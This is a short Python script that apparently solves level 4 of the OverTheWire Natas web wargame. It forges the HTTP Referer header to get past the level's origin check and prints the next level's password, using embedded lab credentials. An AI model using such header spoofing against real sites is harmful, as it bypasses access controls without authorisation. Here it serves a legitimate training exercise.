# Natas4 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL         = "http://natas4.natas.labs.overthewire.org/"
referer_URL = "http://natas5.natas.labs.overthewire.org/"

auth_name = 'natas4'
auth_pass = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
# ***********************************************

# We have to access the page coming from 'http://natas5...'.
# This can easily be done and faked via the 'referer' header.
r = requests.get(URL, auth=(auth_name, auth_pass), headers={'referer': referer_URL})

for x in r.iter_lines():
    if "password" in x:
        print x